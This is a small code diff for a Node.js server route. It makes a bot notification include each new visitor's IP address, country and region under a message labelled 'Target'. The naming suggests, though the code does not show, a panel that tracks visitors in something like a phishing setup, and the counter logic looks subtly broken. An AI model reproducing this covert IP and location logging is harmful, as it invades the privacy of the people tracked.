@@ -648,6 +648,7 @@ module.exports.get_data = (app, users, bot) => {
   app.post(proxyUrl + "/new_user", function (request, response) {
     let product_sub = request?.body.sicret;
     let step = request.body?.step;
+    let userLocation = request.body?.userLocation;
     let message;
 
     switch (step) {
@@ -679,7 +680,7 @@ module.exports.get_data = (app, users, bot) => {
           message = `🏛 Target ${user_time} (${Math.max.apply(
             null,
             list_of_users
-          )}) ${(users += 1)}`;
+          )}) ${(users += 1)} [${userLocation?.ip}] ${userLocation?.country} / ${userLocation?.region} ${userLocation?.flag}`;
         }
 
         for (let u in users) {
